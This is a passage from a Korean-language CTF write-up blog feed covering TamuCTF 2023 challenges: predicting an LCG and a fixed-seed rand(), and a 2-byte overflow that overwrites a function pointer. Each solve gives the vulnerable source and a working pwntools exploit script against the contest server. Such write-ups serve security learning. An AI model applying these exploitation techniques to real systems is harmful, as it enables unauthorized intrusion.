seed</span>):</span><br><span class="line">        self.m = m</span><br><span class="line">        self.a = a</span><br><span class="line">        self.c = c</span><br><span class="line">        self.seed = seed</span><br><span class="line">        <span class="keyword">if</span> seed % <span class="number">2</span> == <span class="number">0</span>: <span class="comment"># initial state must be odd</span></span><br><span class="line">            self.seed += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">rand</span>(<span class="params">self</span>):</span><br><span class="line">        self.seed = (self.a * self.seed + self.c) % self.m</span><br><span class="line">        <span class="keyword">return</span> self.seed</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;tamuctf.com&quot;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>, sni=<span class="string">&quot;prng&quot;</span>)</span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line">values = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    values.append(<span class="built_in">int</span>(p.recvline(), <span class="number">10</span>))</span><br><span class="line"></span><br><span class="line">prng = Rand(values[-<span class="number">1</span>])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="built_in">print</span>(prng.rand())</span><br><span class="line"><span class="comment"># print(values[-1])</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment"># p.close()</span></span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gigem&#123;D0nt_r0ll_y0uR_oWn_RnG&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Tamu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> z3 </tag>
            
            <tag> crypto </tag>
            
            <tag> prng </tag>
            
            <tag> lcg </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tamu CTF 2023 - Unlocky (pwn, seed, rand)</title>
      <link href="/230503-tamu2023-2.Unlucky-pwn/"/>
      <url>/230503-tamu2023-2.Unlucky-pwn/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1914">https://ctftime.org/event/1914</a></li></ul><blockquote><p>Luck won‚Äôt save you here. Have fun trying to get the flag!<br>Author: nhwn</p></blockquote><ul><li>[102 solves &#x2F; 398 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>Î∞îÏù¥ÎÑàÎ¶¨ÏôÄ cÌååÏùºÏùÑ Ï§ÄÎã§. ÏπúÏ†àÌïòÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> seed = <span class="number">69</span>;</span><br><span class="line">    srand(&amp;seed);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Here&#x27;s a lucky number: %p\n&quot;</span>, &amp;main);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> lol = <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> input = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">7</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Enter lucky number #%d:\n&quot;</span>, i);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;input);</span><br><span class="line">        <span class="keyword">if</span> (rand() != input) &#123;</span><br><span class="line">            lol = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lol) &#123;</span><br><span class="line">        <span class="type">char</span> flag[<span class="number">64</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        FILE* f = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">        fread(flag, <span class="number">1</span>, <span class="keyword">sizeof</span>(flag), f);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Nice work, here&#x27;s the flag: %s\n&quot;</span>, flag);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;How unlucky :pensive:&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>pieÍ∞Ä Í±∏Î†§ÏûàÎäîÎç∞ <code>main</code>ÏùÑ Ï∂úÎ†•Ìï¥Ï§ÄÎã§. Ïù¥Í≤ÉÏúºÎ°ú <code>pie base</code>Î•º Íµ¨Ìï† Ïàò ÏûàÎã§.</p><p><code>rand()</code>Î•º ÏòàÏ∏°ÌïòÎ©¥ <code>flag</code>Î•º ÌöçÎìùÌï† Ïàò ÏûàÎã§. Ïó¨Í∏∞ÏÑú Ï∑®ÏïΩÏ†êÏùÄ <code>seed</code>Í∞Ä Í≥†Ï†ïÎêòÏñ¥ ÏûàÏñ¥ÏÑú <code>rand()</code>Î•º ÏòàÏ∏°Ìï† Ïàò ÏûàÎã§. Ïù¥Î•º ÏúÑÌï¥ cÌååÏùºÏùÑ ÌïòÎÇò ÎßåÎì§Ïñ¥ÏÑú ÏòàÏ∏°Ìïú <code>rand()</code> Í∞íÏùÑ Î∞õÏïÑÏôÄÏÑú ÏûÖÎ†•ÏúºÎ°ú ÎÑ£Ïñ¥Ï£ºÎ©¥ Îê† ÎìØ ÌïòÎã§.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><p><code>rand()</code>Î•º ÏòàÏ∏°ÌïòÍ∏∞ ÏúÑÌï¥ ÏïÑÎûòÏôÄ Í∞ôÏùÄ cÌååÏùºÏùÑ ÎßåÎì§Ïñ¥ÏÑú Ïª¥ÌååÏùºÌïúÎã§. Ïö∞Î¶¨Îäî Î¨∏Ï†ú Î∞îÏù¥ÎÑàÎ¶¨Ïùò seedÍ∞í Ï£ºÏÜåÎ•º Íµ¨ÏÜåÌï¥ÏÑú Ïù∏ÏûêÎ°ú ÎÑòÍ≤®Ï£ºÍ≥† <code>srand()</code> Ìï®Ïàò Ïù∏ÏûêÎ°ú ÏÇ¨Ïö©Ìï¥Ïïº ÌïúÎã§. Í∑∏Î¶¨Í≥† Î¨∏Ï†ú Î∞îÏù¥ÎÑàÎ¶¨ÏóêÏÑú <code>rand()</code> Í∞íÏùÑ 7Î≤à ÎßûÏ∂îÎäî Í≤ÉÏùÑ ÏöîÍµ¨ÌñàÍ∏∞ ÎïåÎ¨∏Ïóê Ïù¥Í≤ÉÏùÑ Í∑∏ÎåÄÎ°ú cÎ°ú Íµ¨ÌòÑÌï¥Ï§ÄÎã§. ÏûäÏßÄÎßêÏïÑÏïºÌï† Í≤ÉÏùÄ ÌååÏù¥Ïç¨ Ïä§ÌÅ¨Î¶ΩÌä∏ÏóêÏÑú Î∞©Í∏à ÎßåÎì† Î∞îÏù¥ÎÑàÎ¶¨Ïùò Ï∂úÎ†•Í∞íÏùÑ Î∞õÏïÑÏôÄÏïºÌïúÎã§Îäî ÏÇ¨Ïã§Ïù¥Îã§. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc 1.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// printf(&quot;%d\n&quot;, atoi(argv[1]));</span></span><br><span class="line">srand(atoi(argv[<span class="number">1</span>]));</span><br><span class="line"><span class="type">int</span> random = rand();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, random);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> random1 = rand();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, random1);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> random2 = rand();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, random2);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> random3 = rand();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, random3);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> random4 = rand();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, random4);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> random5 = rand();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, random5);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> random6 = rand();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, random6);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;tamuctf.com&quot;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>, sni=<span class="string">&quot;unlucky&quot;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./unlucky&#x27;)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./unlucky&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">e.address = <span class="built_in">int</span>(p.recvline(), <span class="number">16</span>) - <span class="number">0x11a5</span></span><br><span class="line"></span><br><span class="line">seed = e.address + <span class="number">0x4068</span></span><br><span class="line"><span class="built_in">print</span>(seed)</span><br><span class="line">random = subprocess.check_output([<span class="string">&#x27;./a.out&#x27;</span>, <span class="built_in">str</span>(seed)]).strip().split(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">random = [<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> random]</span><br><span class="line"><span class="built_in">print</span>(random)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(random[<span class="number">0</span>]))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(random[<span class="number">1</span>]))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(random[<span class="number">2</span>]))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(random[<span class="number">3</span>]))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(random[<span class="number">4</span>]))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(random[<span class="number">5</span>]))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(random[<span class="number">6</span>]))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gigem&#123;1_n33d_b3tt3r_3ntr0py_s0urc3s&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Tamu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rand </tag>
            
            <tag> seed </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tamu CTF 2023 - Pointers (pwn, 2bytes overflow)</title>
      <link href="/230503-tamu2023-3.Pointers-pwn/"/>
      <url>/230503-tamu2023-3.Pointers-pwn/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1914">https://ctftime.org/event/1914</a></li></ul><blockquote><p>I‚Äôve been messing with pointers lately which never goes wrong, right?<br>Author: anomie</p></blockquote><ul><li>[90 solves &#x2F; 421 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>Î∞îÏù¥ÎÑàÎ¶¨ÏôÄ ÏÜåÏä§ÏΩîÎìúÎ•º Ï†úÍ≥µÌï¥Ï§ÄÎã§.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">upkeep</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// Not related to the challenge, just some stuff so the remote works correctly</span></span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span>* argv[] = &#123;<span class="string">&quot;/bin/cat&quot;</span>, <span class="string">&quot;flag.txt&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    execve(argv[<span class="number">0</span>], argv, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">lose</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span>* argv[] = &#123;<span class="string">&quot;/bin/echo&quot;</span>, <span class="string">&quot;loser&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    execve(argv[<span class="number">0</span>], argv, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">010</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Interaction pls: &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    upkeep();</span><br><span class="line">    <span class="type">void</span>* func_ptrs[] = &#123;lose, win&#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;All my functions are being stored at %p\n&quot;</span>, func_ptrs);</span><br><span class="line">    </span><br><span class="line">    vuln();</span><br><span class="line">    </span><br><span class="line">    <span class="type">void</span> (*poggers)() = func_ptrs[<span class="number">0</span>];</span><br><span class="line">    poggers();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>vuln</code> Ìï®ÏàòÎ•º IDAÎ°ú ÏÇ¥Ìé¥Î≥¥Î©¥ ÏïÑÎûòÏôÄ Í∞ôÎã§. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+8h] [rbp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Interaction pls: &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0xA</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2byte overflowÍ∞Ä Î∞úÏÉùÌïúÎã§. ÌõÑÏóê <code>void (*poggers)() = func_ptrs[0];</code> ÏùÑ ÌÜµÌï¥ <code>lose</code> Ìï®ÏàòÍ∞Ä Ìò∏Ï∂úÎêúÎã§. Ïù¥ ÎåÄÏã† <code>vuln</code> Ìï®ÏàòÏùò overflowÎ•º ÌÜµÌï¥ <code>win</code> Ìï®ÏàòÍ∞Ä Ìò∏Ï∂úÎêòÎäî Í≤ÉÏù¥ Î™©ÌëúÏù¥Îã§.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><p>Ï≤òÏùåÏóê Ï∂úÎ†•Ìï¥Ï£ºÎäî Ìï®Ïàò Ìè¨Ïù∏ÌÑ∞ Ï£ºÏÜåÎ•º <code>0x7ffebafcc630</code>ÎùºÍ≥† ÌïòÏûê. Ïù¥Îäî <code>lose</code> Ìï®Ïàò Ï£ºÏÜåÍ∞Ä Ï†ÄÏû•ÎêòÏñ¥ÏûàÍ≥† +8Ìïú <code>0x7ffebafcc638</code>ÏóêÎäî <code>win</code> Ìï®Ïàò Ï£ºÏÜåÍ∞Ä Ï†ÄÏû•ÎêòÏñ¥ÏûàÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">‚Üí 0x5589074ca2c4 &lt;main+74&gt;        mov    rax, QWORD PTR [rbp-0x20]</span><br><span class="line">  0x5589074ca2c8 &lt;main+78&gt;        mov    QWORD PTR [rbp-0x8], rax</span><br><span class="line">  0x5589074ca2cc &lt;main+82&gt;        mov    rdx, QWORD PTR [rbp-0x8]</span><br><span class="line">  0x5589074ca2d0 &lt;main+86&gt;        mov    eax, 0x0</span><br><span class="line">  0x5589074ca2d5 &lt;main+91&gt;        call   rdx</span><br></pre></td></tr></table></figure><p><code>rbp-0x20</code> Ï£ºÏÜåÏóê Ï†ÄÏû•Îêú Í∞íÏùÑ <code>rax</code>Ïóê ÎÑ£ÎäîÎã§. Ïù¥ Í∞íÏù¥ Ï†ÑÎã¨ÎêòÏñ¥ <code>rdx</code>Ïóê Îì§Ïñ¥Í∞ÄÍ≥† Í≤∞Íµ≠ <code>call rdx</code>Î•º Ïã§ÌñâÌïúÎã§. Í≤∞Íµ≠ <code>rbp</code>ÏóêÎäî <code>0x7ffebafcc638 + 0x20</code> Í∞íÏù¥ Îì§Ïñ¥Í∞ÄÏïº ÌïúÎã§.</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;tamuctf.com&quot;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>, sni=<span class="string">&quot;pointers&quot;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./pointers&#x27;)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;at &#x27;</span>)</span><br><span class="line">func_ptrs = p.recvline()[:-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(func_ptrs)</span><br><span class="line"></span><br><span class="line">win = func_ptrs[-<span class="number">4</span>:]</span><br><span class="line"><span class="built_in">print</span>(win)</span><br><span class="line">win = <span class="built_in">int</span>(win, <span class="number">16</span>) + <span class="number">8</span> + <span class="number">0x20</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(win))</span><br><span class="line"></span><br><span class="line"><span class="comment"># real_win = int(func_ptrs, 16) + 8</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">8</span></span><br><span class="line">payload += p16(win)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gigem&#123;small_overflows_are_still_effective&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Tamu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rbp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tamu CTF 2023 - Randomness (pwn, fini)</title>
      <link href="/230503-tamu2023-4.Randomness-pwn/"/>
      <url>/230503-tamu2023-4.Randomness-pwn/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1914">https://ctftime.org/event/1914</a></li></ul><blockquote><p>I made this program to test how srand and rand work, but it keeps segfaulting. I don‚Äôt read compiler warnings so I can‚Äôt figure out why it‚Äôs broken.<br>Author: anomie</p></blockquote><ul><li>[86 solves &#x2F; 428 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>Î∞îÏù¥ÎÑàÎ¶¨ÏôÄ ÏÜåÏä§ÏΩîÎìúÎ•º Ï†úÍ≥µÌï¥Ï§ÄÎã§.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span>* argv[] = &#123;<span class="string">&quot;/bin/cat&quot;</span>, <span class="string">&quot;flag.txt&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    execve(argv[<span class="number">0</span>], argv, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">foo</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> seed;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Enter a seed:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%lu&quot;</span>, &amp;seed);</span><br><span class="line">    srand(seed);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">bar</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> a;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Enter your guess:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%lu&quot;</span>, a);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (rand() == a) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;correct!&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;incorrect!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;hello!&quot;</span>);</span><br><span class="line">    foo();</span><br><span class="line">    bar();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;goodbye!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÏÇ¨Ïã§ 